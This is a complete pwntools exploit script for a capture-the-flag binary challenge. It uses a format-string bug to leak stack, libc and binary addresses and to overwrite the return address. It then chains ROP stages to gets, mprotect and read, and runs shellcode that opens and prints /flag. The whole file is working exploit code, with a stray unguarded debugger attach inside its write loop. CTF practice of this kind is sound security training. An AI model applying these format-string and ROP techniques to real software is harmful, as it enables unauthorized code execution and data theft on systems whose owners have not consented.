from pwn import *
import sys

binary = './attachment_patched'
libc = ELF('./libc.so.6')
context.log_level = 'info'
context.binary = binary
context.arch = 'amd64'

s = '''
b * printf
c
'''

# Start process
if args.REMOTE:
    p = remote("chal.polyuctf.com", 34023)
else:
    p = process(binary)
    if args.GDB:
        gdb.attach(p, s)

# Step 1: First exploit to leak a stack address
p.send(b"%pAAA")
p.recvuntil(b"0x")
stack_leak = int(p.recvuntil(b"AAA", drop=True), 16)
info(f"Stack leak: {hex(stack_leak)}")

# Step 2: Using the stack leak to redirect execution flow
# The goal is to modify the return address to point back to main
# This allows us to keep exploiting the format string vulnerability
ra_addr = stack_leak - 27  # Calculate address of return address on stack
payload = "%c%c%p%c"       # Output some chars (17 total with the address)
written = 17

# Calculate how many chars to write for the next %hn
expected = ra_addr & 0xffff  # Get the lower 2 bytes of return address location
payload += f"%{expected - written}c"  # Print enough chars to reach this value
written = expected & 0xff

# Write this value (lower 2 bytes of ra_addr) to the location specified by %41$hn
payload += "%hn"

# Now modify the return target to point to main+0x40 (0x140b -> 0x144b)
# 0x4b - written is the adjustment needed
payload += f"%{(0x4b-written)&0xff}c"
payload += "%41$hhn"  # Write 1 byte at offset 41

p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Step 3: Use our control flow to leak libc address


p.recv(4)  # Skip some output

libc_leak = int(p.recv(12), 16)  # Get leaked address
info(f"Libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x10e1f2  # Calculate libc base
success(f"Libc base: {hex(libc.address)}")

# Step 4: Leak binary base address
p.send(b"%15$p")
p.recvuntil(b"give you one chance!!!\n0x")
elf_leak = int(p.recv(12), 16)
info(f"ELF leak: {hex(elf_leak)}")
elf_base = elf_leak - 0x140b
success(f"Binary base: {hex(elf_base)}")

# Step 5: Build a ROP chain that will:
# 1. Call gets() to read more data
# 2. The data read will be a larger ROP chain
rop = ROP(libc)
start_addr = ra_addr + 0x30  # Location where we'll write our ROP chain
payload = flat([
    rop.rdi[0],              # Pop RDI gadget
    start_addr + 0x18,       # Address to read into (our second stage)
    libc.sym["gets"],        # Call gets() to read more data
])

# Step 6: Write the ROP chain to memory 2 bytes at a time
# First we need to change where we're writing to (%29$hn)
# Then we write the actual values (%43$hn)
print(len(payload))
for i in range(0, len(payload), 2):
    # Set up pointer for address to write to
    written = 0x7e
    next_write = (start_addr + i - written) & 0xffff
    payload2 = f"%{0x7e}c%41$hhn"  # Write to a known pointer
    if next_write != 0:
        payload2 += f"%{next_write}c"
    payload2 += f"%29$hn"  # Point to where we want to write
    p.recvuntil(b"begin your challenge\n")
    gdb.attach(p, s)
    p.send(payload2.encode())
    
    # Now write the actual 2 bytes of our ROP chain
    written = 0x7e
    next_write = (u16(payload[i:i+2]) - written) & 0xffff
    payload2 = f"%{0x7e}c%41$hhn"
    if next_write != 0:
        payload2 += f"%{next_write}c"
    payload2 += f"%43$hn"  # Write the value
    p.recvuntil(b"begin your challenge\n")
    p.send(payload2.encode())

# Step 7: Trigger our ROP chain with a 'leave; ret' gadget (0x9)
payload2 = f"%{0x9}c%41$hhnXXXXX\0"  # XXXXX as a marker to know when our input is done
p.recvuntil(b"begin your challenge\n")
p.send(payload2.encode())
p.recvuntil(b"XXXXX")  # Wait until our marker appears

# Step 8: Send second stage ROP chain
# This ROP chain will:
# 1. Call mprotect to make a region executable
# 2. Read shellcode into that region
# 3. Jump to the shellcode
rop = ROP(libc)
rop.call(libc.sym["mprotect"], [elf_base + 0x4000, 0x1000, 7])  # Make memory executable
rop.call(libc.sym["read"], [0, elf_base + 0x4000, 0x1000])      # Read shellcode
rop.call(elf_base + 0x4000)                                     # Jump to shellcode
p.sendline(rop.chain())

# Step 9: Send our shellcode to read the flag file
flag_path = b"/flag".ljust(32, b"\0")

# The shellcode does:
# 1. Open the flag file
# 2. Read the contents
# 3. Write the contents to stdout
shellcode = f"""
push 0x0
push 0x0
push 0x0
push 0x0
mov rax, {unpack(flag_path[24:32].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[16:24].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[8:16].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[0:8].ljust(8, bytes([0])), "all")}
push rax

mov rax, 437    # SYS_openat2
mov rdi, -100   # AT_FDCWD
mov rsi, rsp    # pointer to pathname
lea rdx, [rsp + 32]  # pointer to openat2 structure
mov r10, 0x18   # size of openat2 structure
syscall

mov rax, 0      # SYS_read
mov rdi, 3      # fd returned from openat2
mov rsi, rsp    # buffer to read into
mov rdx, 0x100  # number of bytes to read
syscall

mov rax, 1      # SYS_write
mov rdi, 1      # stdout
mov rsi, rsp    # buffer to write from
mov rdx, 0x100  # number of bytes to write
syscall

int3            # breakpoint
"""

p.send(asm(shellcode))

# Receive and print the flag
flag = p.recv(0x100)
print(flag)

p.interactive()
